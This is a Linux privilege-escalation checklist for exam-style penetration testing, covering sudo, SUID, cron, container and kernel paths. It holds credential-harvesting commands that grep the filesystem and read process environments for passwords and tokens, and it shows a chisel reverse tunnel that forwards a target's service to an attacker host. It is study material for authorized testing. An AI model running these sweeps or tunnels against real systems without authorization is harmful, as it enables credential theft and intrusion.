# Linux Privilege Escalation Methodology

Use this in priority order: baseline, fast paths, and only then kernel/service exploits as a last resort. Confirm every finding manually, capture the user flag before PE, and capture the elevated flag immediately after success.

## 1. Baseline and user-flag check

- [ ] Record `whoami`, `id`, `groups`, hostname, shell type, and the current working directory.
- [ ] Capture the exact OS version, route, interfaces, open listeners, and `sudo -l` output.
- [ ] Read the user flag (`local.txt` or the exam-specified value) and record it before changing privilege.
- [ ] If `sudo -l` shows a passwordless command, inspect that exact binary or script immediately while automation runs.

```bash
whoami; id; groups; hostname
uname -a; cat /etc/os-release
ip addr; ip route; ss -tulpen
sudo -l
```

- [ ] Use the Linux privilege escalation reference in [Linux Privilege Escalation](Privilege%20Escalation/Linux%20Privilege%20Escalation.md) as the supporting path when the issue is not obvious.

## 2. Run the high-probability checks first

### Sudo rights and environment abuse

- [ ] Review every allowed `sudo` command, version, arguments, and environment. Check `NOPASSWD`, `SETENV`, wildcard arguments, and custom scripts.
- [ ] Prefer a narrow documented command over a noisy kernel exploit.

```bash
sudo -l
sudo -l -U <user>
```

### Local credential reuse and artifacts

- [ ] Search readable shell histories, app configs, `.env`, `.git` repos, cron/systemd units, SSH config, `.netrc`, `.pgpass`, browser stores, Docker config, and AWS credentials.
- [ ] Check credentials against local `su`, `sudo -l -U`, SSH, databases, and in-scope hosts while preserving username/domain context.

```bash
find / -type f \( -name '*.conf' -o -name '*.ini' -o -name '*.env' -o -name '*.yml' -o -name '*.xml' -o -name '*.bak' -o -name '*.old' \) 2>/dev/null
cat ~/.bash_history ~/.zsh_history ~/.ssh/config ~/.netrc 2>/dev/null
grep -riE 'password|passwd|secret|token|credential' /etc /var/www /opt /home /var/backups 2>/dev/null
for p in /proc/[0-9]*; do tr '\0' ' ' < "$p/cmdline" 2>/dev/null; tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -iE 'pass|secret|token|key'; done
```

- [ ] For DB services, validate role rights and local file permissions before using a file-write or `COPY FROM PROGRAM` path; use [PostgreSQL](Enumeration/PostgreSQL.md) when applicable.

### SUID/SGID and capabilities

- [ ] Enumerate SUID, SGID, and file capabilities before trying a kernel exploit.
- [ ] Confirm the binary or capability is the actual issue and the shell's effective UID changes after exploitation.

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

### Cron, systemd, timers, and PATH

- [ ] Inspect root-run scripts, cron jobs, services, and timers for writable or misconfigured paths.
- [ ] Check the script owner, parent directory permissions, environment, executable path, and arguments before modifying anything.
- [ ] Confirm the scheduler or service actually runs as root or another privileged account before using the path.

```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null
systemctl list-timers --all
find /etc /opt /usr/local /var/www -type f -writable 2>/dev/null
```

- [ ] If a service or task uses a weak `PATH`, confirm which writable directory wins before substituting a malicious binary.

### Writable sensitive files, NFS, and service configuration

- [ ] Check `/etc/passwd`, `/etc/shadow`, sudoers include files, service config files, and mounted NFS exports for actual write access.
- [ ] Use `showmount -e <target>` only when it is in scope and the export is relevant.
- [ ] Consider the root-owned file or SUID path only when the export behavior and permissions support it.

## 3. Check containers, local services, and forwarding paths

- [ ] If the host is a container, confirm capabilities, mounts, Docker socket access, and possible host escape paths before using a local exploit.
- [ ] If a local service is running, identify the process, version, credentials, and route that exposes it.
- [ ] Use [Pivoting and Port Forwarding](Lateral%20Movement/Pivoting%20%26%20Port%20Forwarding.md) for relevant forwarding tasks, but do not use Ligolo-ng in this standalone-machine workflow.

```bash
cat /proc/1/cgroup 2>/dev/null; ls -la /.dockerenv 2>/dev/null
id; groups
ss -tulpen; netstat -tulnp 2>/dev/null
```

```bash
# Attacker: reverse-capable server
chisel server -p 9999 --reverse

# Compromised target: forward its loopback service back to attacker port 8888
./chisel client <attacker-ip>:9999 R:8888:127.0.0.1:<internal-port>
```

- [ ] Connect to `127.0.0.1:8888` on the attacker and verify the forwarded service before using it for follow-on access.

## 4. Kernel and service exploits are last resort

- [ ] Gather the exact kernel, distro, package, and service versions before trying a local exploit.
- [ ] Match a specific vulnerability and confirm the exploit prerequisites and crash risk.
- [ ] Prefer a credential, config, or SUID path over a kernel exploit whenever the direct route is cleaner and less noisy.
- [ ] Preserve the exploit source and output so the path remains auditable.

## 5. Exploit, verify, and capture the elevated flag

- [ ] Confirm the path is writable or triggerable before executing a privilege escalation attempt.
- [ ] Use the least disruptive proof that demonstrates the intended privilege gain.
- [ ] Verify `id` shows UID 0 (or the exact intended elevated identity) and confirm the hostname.
- [ ] Read the elevated flag (`proof.txt`, `root.txt`, or the exam-specified path) immediately after the successful PE.
- [ ] Record the command, exact output, and any file or service changes made in the evidence log.
- [ ] Check for local-only services and credentials that could support the next target, but do not assume the same password or hash works elsewhere.

- [ ] Do not leave persistence or long-lived access behind unless the exam explicitly requires it.
